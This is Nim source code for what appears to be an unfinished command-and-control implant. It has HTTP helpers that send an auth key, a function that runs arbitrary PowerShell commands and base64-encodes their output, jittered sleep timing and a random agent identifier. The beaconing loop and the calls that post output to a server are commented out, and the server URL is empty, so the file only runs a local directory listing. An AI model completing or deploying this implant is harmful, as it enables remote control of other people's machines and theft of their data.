import httpclient, base64, json, osproc, random, os, strutils

proc get_request_headers(url: string, api_key: string):string =
    let client = newHttpClient()
    client.headers = newHttpHeaders(@[("X-Auth", api_key), ("Content-Type", "application/json"),("Accept","application/json")])
    let res = client.get(url)
    return res.body

proc post_request_headers(url: string, api_key: string, data: string):string =
    let json_command = $(%*{"command_output":data})
    let client = newHttpClient()
    client.headers = newHttpHeaders(@[("X-Auth", api_key), ("Content-Type", "application/json"),("Accept","application/json")])
    let res = client.post(url, body=json_command)
    return res.body

proc execute_command(command: string):string =
    var commandArgs : seq[string]
    commandArgs.add("-c")
    for element in command.split(" "):
        commandArgs.add(element)
    echo $commandArgs
    let output = execProcess("powershell", args=commandArgs, options={poUsePath, poStdErrToStdOut, poDaemon})
    let encoded_command = encode($output)
    return $encoded_command

proc random_sleep(sleep_time:int):int =
    return sleep_time*1000 + rand(sleep_time*1000)

proc main() =
    randomize()
    var secret_key = "abc"
    var url = ""
    var identifier = rand(1000000000000000000)
    var sleep_time = 1
    echo $(random_sleep(sleep_time))
    echo $identifier
    #while true:
        #var command_url = url+"command"
    #echo $secret_key
    let output = execute_command("dir C:\\Users\\")
    echo "command output :"
    echo $output

    #let request_output = get_request_headers(url, api_key)
    #let post_output = post_request_headers(url, api_key, encoded_command)
    #echo $request_output
    #echo $post_output

when isMainModule:
    main()
